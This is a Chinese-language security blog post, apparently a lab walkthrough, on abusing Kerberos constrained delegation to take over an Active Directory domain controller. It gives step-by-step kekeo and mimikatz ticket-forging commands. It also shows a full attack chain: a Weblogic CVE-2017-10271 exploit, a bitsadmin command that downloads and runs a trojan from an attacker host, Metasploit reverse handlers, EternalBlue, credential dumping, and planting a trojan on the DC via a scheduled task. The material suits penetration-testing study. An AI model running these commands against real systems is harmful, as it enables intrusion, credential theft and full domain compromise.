@@ -1,0 +1,631 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="F4tty" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      内网横向移动(八)-约束委派 
+      
+      
+      |
+    
+     F4tty
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/img/favicon.ico">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/img/avatar.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">F4tty</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">归档</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">分类</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">标签</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">友链</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">关于我</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">内网横向移动(八)-约束委派</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2022-10-15 00:00:00
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="分类"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" title="内网安全">
+                    <b>#</b> 内网安全
+                  </a>
+                </span>
+                
+              </span>
+          
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/%E5%86%85%E7%BD%91/" title="内网">
+                    #内网
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="内网横向移动-八-约束委派"><a href="#内网横向移动-八-约束委派" class="headerlink" title="内网横向移动(八)-约束委派"></a>内网横向移动(八)-约束委派</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>域委派是指将域内用户的权限委派给服务账号，使得服务账号能以域用户的权限在域内展开活动，去做域用户能够做的事。<br>注意：能够被委派的用户只能是服务账号或者机器账号<br><strong>简言之：当A访问服务B时，服务B拿着A用户的凭证去访问服务C，这个过程称为委派。</strong></p>
+<p>委派攻击分类：<br>1、非约束委派<br>2、约束性委派<br>3、基于资源的约束性委派</p>
+<h2 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>由于非约束委派的不安全性，微软在windows server 2003中引入了约束委派，对Kerberos协议进行了拓展，引入了SService for User to Self (S4U2Self)和 Service for User to Proxy (S4U2proxy)。</p>
+<p><strong>S4U2self</strong><br>允许受约束委派的服务代表任意用户向KDC请求服务自身，从而获得一张该用户（任意用户）的对当前受约束委派服务的票据TGS(ST)，该服务票据TGS(ST)包含了用户的相关信息，比如该用户的组信息等。</p>
+<p><strong>S4U2proxy</strong><br>允许受约束委派的服务通过服务票据ST，然后代表用户去请求指定的服务。</p>
+<h3 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h3><p>如果攻击者控制了服务A的账号，并且服务A配置了到域控的CIFS服务的约束性委派。<br>则攻击者可以先使用S4u2seflt申请域管用户（administrator）访问A服务的ST1，<br>然后使用S4u2Proxy以administrator身份访问域控的CIFS服务，即相当于控制了域控。</p>
+<h3 id="复现配置"><a href="#复现配置" class="headerlink" title="复现配置"></a>复现配置</h3><h4 id="1、配置SPN"><a href="#1、配置SPN" class="headerlink" title="1、配置SPN"></a>1、配置SPN</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">域控机输入一下命令</span></span><br><span class="line">setspn -U -A priv/test webadmin</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/dc35434a/1665885209298-2172965e-b35b-46b8-8c4e-fce684101772.png" alt="image.png"></p>
+<h4 id="2、机器设置"><a href="#2、机器设置" class="headerlink" title="2、机器设置"></a>2、机器设置</h4><p>机器设置仅信任此计算机指定服务-cifs<br><img src="/posts/dc35434a/1665819484661-670a4376-fbab-47a6-b296-3caaeac9d31b.png" alt="image.png"><br><img src="/posts/dc35434a/1665819521345-e39c76b6-20e7-4efa-ab08-fcc9c22a879a.png" alt="image.png"><br><img src="/posts/dc35434a/1665819540202-9a8a048b-af3f-4233-b8b9-3f6f8da92a61.png" alt="image.png"><br><img src="/posts/dc35434a/1665819732701-3f473480-0e64-44f1-80a5-7d2c784a08fd.png" alt="image.png"></p>
+<h4 id="2、用户设置"><a href="#2、用户设置" class="headerlink" title="2、用户设置"></a>2、用户设置</h4><p>用户设置仅信任此计算机指定服务-cifs<br><img src="/posts/dc35434a/1665885296155-d5a0c27a-b898-4695-a661-608290a803d5.png" alt="image.png"><br>步骤和机器配置大体相同<br>已经拿下webserver权限利用约束委派攻击域控<br><img src="/posts/dc35434a/1665886060119-157bd90c-763f-4d51-9cb5-cb2b6eb06d75.png" alt="image.png"></p>
+<h3 id="判断查询"><a href="#判断查询" class="headerlink" title="判断查询"></a>判断查询</h3><p>上传Adfind<br><a target="_blank" rel="noopener" href="https://www.softpedia.com/get/Programming/Other-Programming-Files/AdFind.shtml">https://www.softpedia.com/get/Programming/Other-Programming-Files/AdFind.shtml</a><br>查询机器用户（主机）配置约束委派</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -b &quot;DC=god,DC=org&quot; -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/dc35434a/1665886236920-2f99656d-fbb8-4dc7-b871-031877d2b695.png" alt="image.png"><br>查询服务账户（主机）配置约束委派</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -b &quot;DC=god,DC=org&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/dc35434a/1665886266294-612e2dba-3e89-4cd7-bc30-ccac389c7320.png" alt="image.png"></p>
+<h3 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h3><p>上传kekeo<br><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/kekeo">https://github.com/gentilkiwi/kekeo</a></p>
+<h4 id="1、获取用户的票据"><a href="#1、获取用户的票据" class="headerlink" title="1、获取用户的票据"></a>1、获取用户的票据</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">明文密码利用</span></span><br><span class="line">kekeo &quot;tgt::ask /user:webadmin /domain:god.org /password::admin!@#45 /ticket:administrator.kirbi&quot; &quot;exit&quot;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">hash</span>利用</span></span><br><span class="line">kekeo &quot;tgt::ask /user:webadmin /domain:god.org /NTLM:518b98ad4178a53695dc997aa02d455c /ticket:administrator.kirbi&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/dc35434a/1665886784210-8a029af9-ac06-40fd-a7ab-4a328e8d3919.png" alt="image.png"></p>
+<h4 id="2、利用用户票据获取域控票据"><a href="#2、利用用户票据获取域控票据" class="headerlink" title="2、利用用户票据获取域控票据"></a>2、利用用户票据获取域控票据</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">计算机名利用</span></span><br><span class="line">kekeo &quot;tgs::s4u /tgt:TGT_webadmin@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi /user:Administrator@god.org /service:cifs/owa2010cn-god&quot; &quot;exit&quot;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">域名利用</span></span><br><span class="line">kekeo &quot;tgs::s4u /tgt:TGT_webadmin@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi /user:Administrator@god.org /service:cifs/owa2010cn-god.god.org&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/dc35434a/1665886907781-09a85d85-907e-443b-b635-fede0b91bc5e.png" alt="image.png"></p>
+<h4 id="3、导入票据到内存"><a href="#3、导入票据到内存" class="headerlink" title="3、导入票据到内存"></a>3、导入票据到内存</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ptt TGS_Administrator@god.org@GOD.ORG_cifs~owa2010cn-god.god.org@GOD.ORG.kirbi</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/dc35434a/1665886961659-1c562e76-69e6-44f0-84a5-4a9bbabed429.png" alt="image.png"></p>
+<h4 id="4、连接通讯域控"><a href="#4、连接通讯域控" class="headerlink" title="4、连接通讯域控"></a>4、连接通讯域控</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\owa2010cn-god.god.org\c$</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/dc35434a/1665886984646-115b96ed-5b5c-4498-a25f-f5cc2dab93b3.png" alt="image.png"><br>后续可以利用copy&amp;at拿下域控</p>
+<h2 id="实战靶机-约束委派"><a href="#实战靶机-约束委派" class="headerlink" title="实战靶机-约束委派"></a>实战靶机-约束委派</h2><p>从外网 Weblogic 打到内网，再到约束委派接管域控<br><img src="/posts/dc35434a/1665746136715-f2078bd9-893d-440b-b776-9dc6a5280777.png" alt="image.png"></p>
+<h3 id="攻击Weblogic-CVE-2017-10271"><a href="#攻击Weblogic-CVE-2017-10271" class="headerlink" title="攻击Weblogic - CVE-2017-10271"></a>攻击Weblogic - CVE-2017-10271</h3><p><img src="/posts/dc35434a/1665821780451-a4412309-63e9-4b01-93a1-6ddaac1d9f40.png" alt="image.png"><br><img src="/posts/dc35434a/1665821863546-6546b9ef-112a-4fe9-bb50-6e18e57fa665.png" alt="image.png"><br>下载执行木马上线CS</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">下载木马</span></span><br><span class="line">bitsadmin /rawreturn /transfer down &quot;http://192.168.118.1/test.exe&quot; C:\\Oracle\\Middleware\\Oracle_Home\\user_projects\\domains\\base_domain\\test.exe</span><br><span class="line">test.exe #执行</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/dc35434a/1665822305486-e85b859e-2815-4ac2-b7b4-fdc5d1a5cb85.png" alt="image.png"><br>常规信息搜集<br><img src="/posts/dc35434a/1665822908478-a0e35e87-d4ee-483f-8321-9bebeaa86d82.png" alt="image.png"><br>上传fscan扫描-实战中尽量挂代理在本机扫描,不要上传<br><img src="/posts/dc35434a/1665823719748-49aa9572-4a8c-41bc-b197-a97b4c3bd3d9.png" alt="image.png"></p>
+<h3 id="攻击域内成员主机-MS17-010"><a href="#攻击域内成员主机-MS17-010" class="headerlink" title="攻击域内成员主机 - MS17-010"></a>攻击域内成员主机 - MS17-010</h3><h4 id="1、CS执行联动MSF"><a href="#1、CS执行联动MSF" class="headerlink" title="1、CS执行联动MSF"></a>1、CS执行联动MSF</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spawn msf</span><br></pre></td></tr></table></figure>
+
+<h4 id="2、MSF监听联动配置"><a href="#2、MSF监听联动配置" class="headerlink" title="2、MSF监听联动配置"></a>2、MSF监听联动配置</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/dc35434a/1665823831753-2b4f719b-94ff-449e-96dc-00afab98a0ac.png" alt="image.png"></p>
+<h4 id="3、添加路由"><a href="#3、添加路由" class="headerlink" title="3、添加路由"></a>3、添加路由</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -p #查看当前路由表</span><br><span class="line">run post/multi/manage/autoroute #添加当前路由表</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/dc35434a/1665824104675-381e82fc-c882-43d1-86ac-3ef45ff2e27b.png" alt="image.png"></p>
+<h4 id="4、利用模块"><a href="#4、利用模块" class="headerlink" title="4、利用模块"></a>4、利用模块</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp #正向连接上线</span><br><span class="line">set rhost 10.10.20.7 #设置连接目标</span><br><span class="line">set rhosts 10.10.20.7 #设置扫描目标</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/dc35434a/1665824040764-a08997fe-690b-4cda-a191-7c4f39c1b279.png" alt="image.png"><br>MSF操作不太方便可以将会话转到CS<br>CS生成一个正向木马<br><img src="/posts/dc35434a/1665825027773-14db3b49-c0f0-4344-8a35-6fc0c78da6c5.png" alt="image.png"><br>上传到win7</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload /root/zx.exe C:\\zx.exe</span><br></pre></td></tr></table></figure>
+
+<p>CS连接</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">connect 10.10.20.7 2222</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/dc35434a/1665825438623-19f4445e-b6dd-4a25-bd5d-b838e4854423.png" alt="image.png"><br>再次信息搜集<br><img src="/posts/dc35434a/1665826031969-940508bf-47e8-410e-abdc-7a064ce20189.png" alt="image.png"><br><img src="/posts/dc35434a/1665836126256-1de42374-1c5a-4864-83aa-109933db92ff.png" alt="image.png"><br><img src="/posts/dc35434a/1665836181730-6e4836a3-b484-4107-9cca-a91c115b7f23.png" alt="image.png"><br>CS的mimikatz没有抓到密码 用msf试下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz</span><br><span class="line">creds_all</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/dc35434a/1665836276638-661d5e88-2cc4-48e7-a761-a2f8cbd4537c.png" alt="image.png"></p>
+<h4 id="5、查找域内非约束委派用户和计算机"><a href="#5、查找域内非约束委派用户和计算机" class="headerlink" title="5、查找域内非约束委派用户和计算机"></a>5、查找域内非约束委派用户和计算机</h4><p>先上传AdFind</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -h 10.10.10.8 -u saul -up admin!@#45 -b &quot;DC=redteam,DC=red&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/dc35434a/1665836619467-1ef4dd53-c20e-4fde-89e8-cfe9da6ae8b0.png" alt="image.png"><br>sqlserver存在约束委派<br><img src="/posts/dc35434a/1665836784502-2319d1dc-dd3d-468c-828f-0af1ee074721.png" alt="image.png"></p>
+<h4 id="6、信息收集加口令加漏洞探针"><a href="#6、信息收集加口令加漏洞探针" class="headerlink" title="6、信息收集加口令加漏洞探针"></a>6、信息收集加口令加漏洞探针</h4><p>对sqlserver 10.10.10.18进行信息搜集</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fscan64.exe -h 10.10.10.18</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/dc35434a/1665836959387-2a9d3aeb-285a-4580-8d50-9855625be43f.png" alt="image.png"></p>
+<h3 id="攻击域内数据库主机-MSSQL-提权"><a href="#攻击域内数据库主机-MSSQL-提权" class="headerlink" title="攻击域内数据库主机-MSSQL+提权"></a>攻击域内数据库主机-MSSQL+提权</h3><p><a target="_blank" rel="noopener" href="https://github.com/SafeGroceryStore/MDUT">https://github.com/SafeGroceryStore/MDUT</a><br>配置代理<br>利用工具MDUT连接数据库,上传文件并执行<br><img src="/posts/dc35434a/1665843116221-4ca66e7a-14da-4899-86af-533e217176b4.png" alt="image.png"><br>到cs用ms14-058提权<br>提权时需要在win7新建一个监听器用来接受会话<br><img src="/posts/dc35434a/1665840586872-95ac0f64-6dc7-431d-8b89-a3d9b8ad3ca5.png" alt="image.png"><br><img src="/posts/dc35434a/1665840604615-1faad3aa-6867-4083-a7ea-b2337e90eccc.png" alt="image.png"><br><img src="/posts/dc35434a/1665840711327-0415fc5a-0cbd-46f6-94e2-30e0742ec0bc.png" alt="image.png"><br>成功拿到密码</p>
+<h3 id="攻击域内域控主机-约束委派"><a href="#攻击域内域控主机-约束委派" class="headerlink" title="攻击域内域控主机-约束委派"></a>攻击域内域控主机-约束委派</h3><h4 id="1、kekeo请求获取sqlserver的TGT"><a href="#1、kekeo请求获取sqlserver的TGT" class="headerlink" title="1、kekeo请求获取sqlserver的TGT"></a>1、kekeo请求获取sqlserver的TGT</h4><p>先上传kekeo</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo &quot;tgt::ask /user:sqlserver /domain:redteam.red /password:Server12345 /ticket:administrator.kirbi&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/dc35434a/1665840926996-93f66394-ef37-4935-a81c-a199520ea454.png" alt="image.png"><br><img src="/posts/dc35434a/1665841274718-f0fb2aab-8e4d-40ee-9c0e-1890db6cb3ee.png" alt="image.png"></p>
+<h4 id="2、使用票据请求域控"><a href="#2、使用票据请求域控" class="headerlink" title="2、使用票据请求域控"></a>2、使用票据请求域控</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo &quot;tgs::s4u /tgt:TGT_sqlserver@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi /user:Administrator@redteam.red /service:cifs/owa.redteam.red&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/dc35434a/1665840956003-80221653-8d03-48f6-b173-878a6fdb2acc.png" alt="image.png"><br><img src="/posts/dc35434a/1665841163302-bbeff344-66eb-43be-baac-feff9fdb5b0d.png" alt="image.png"></p>
+<h4 id="3、导入内存"><a href="#3、导入内存" class="headerlink" title="3、导入内存"></a>3、导入内存</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ptt TGS_Administrator@redteam.red@REDTEAM.RED_cifs~owa.redteam.red@REDTEAM.RED.kirbi</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/dc35434a/1665841308580-6c53b80f-ed0b-4046-8785-5f61bbf4595b.png" alt="image.png"></p>
+<h4 id="4、连接域控"><a href="#4、连接域控" class="headerlink" title="4、连接域控"></a>4、连接域控</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\OWA\\c$</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/dc35434a/1665842165495-aaf48a64-9356-4e7b-a67c-34a254100043.png" alt="image.png"><br>后续利用拿下域控</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net use \\owa	</span><br><span class="line">copy zx.exe \\owa\c$ # 木马复制到域控</span><br><span class="line">at \\owa 18:45 c:\zx.exe # 计划任务执行木马</span><br><span class="line">connect 10.10.10.8 2222 </span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/dc35434a/1665842316134-80086269-dabd-4b3c-8f1e-faf2a186cf25.png" alt="image.png"></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/posts/1a5f619c/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2022-10-15 00:00:00
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="分类"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" title="内网安全">
+                        <b>#</b> 内网安全
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/%E5%86%85%E7%BD%91/" title="内网">
+                        #内网
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-%E5%85%AB-%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-text">内网横向移动(八)-约束委派</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="toc-text">写在前面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-text">约束委派</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-text">利用场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E9%85%8D%E7%BD%AE"><span class="toc-text">复现配置</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E9%85%8D%E7%BD%AESPN"><span class="toc-text">1、配置SPN</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E6%9C%BA%E5%99%A8%E8%AE%BE%E7%BD%AE"><span class="toc-text">2、机器设置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E7%94%A8%E6%88%B7%E8%AE%BE%E7%BD%AE"><span class="toc-text">2、用户设置</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%9F%A5%E8%AF%A2"><span class="toc-text">判断查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%AD%A5%E9%AA%A4"><span class="toc-text">利用步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E7%9A%84%E7%A5%A8%E6%8D%AE"><span class="toc-text">1、获取用户的票据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E5%88%A9%E7%94%A8%E7%94%A8%E6%88%B7%E7%A5%A8%E6%8D%AE%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7%E7%A5%A8%E6%8D%AE"><span class="toc-text">2、利用用户票据获取域控票据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81%E5%AF%BC%E5%85%A5%E7%A5%A8%E6%8D%AE%E5%88%B0%E5%86%85%E5%AD%98"><span class="toc-text">3、导入票据到内存</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E3%80%81%E8%BF%9E%E6%8E%A5%E9%80%9A%E8%AE%AF%E5%9F%9F%E6%8E%A7"><span class="toc-text">4、连接通讯域控</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%88%98%E9%9D%B6%E6%9C%BA-%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-text">实战靶机-约束委派</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BBWeblogic-CVE-2017-10271"><span class="toc-text">攻击Weblogic - CVE-2017-10271</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%9F%9F%E5%86%85%E6%88%90%E5%91%98%E4%B8%BB%E6%9C%BA-MS17-010"><span class="toc-text">攻击域内成员主机 - MS17-010</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81CS%E6%89%A7%E8%A1%8C%E8%81%94%E5%8A%A8MSF"><span class="toc-text">1、CS执行联动MSF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81MSF%E7%9B%91%E5%90%AC%E8%81%94%E5%8A%A8%E9%85%8D%E7%BD%AE"><span class="toc-text">2、MSF监听联动配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1"><span class="toc-text">3、添加路由</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E3%80%81%E5%88%A9%E7%94%A8%E6%A8%A1%E5%9D%97"><span class="toc-text">4、利用模块</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5%E3%80%81%E6%9F%A5%E6%89%BE%E5%9F%9F%E5%86%85%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%94%A8%E6%88%B7%E5%92%8C%E8%AE%A1%E7%AE%97%E6%9C%BA"><span class="toc-text">5、查找域内非约束委派用户和计算机</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%8A%A0%E5%8F%A3%E4%BB%A4%E5%8A%A0%E6%BC%8F%E6%B4%9E%E6%8E%A2%E9%92%88"><span 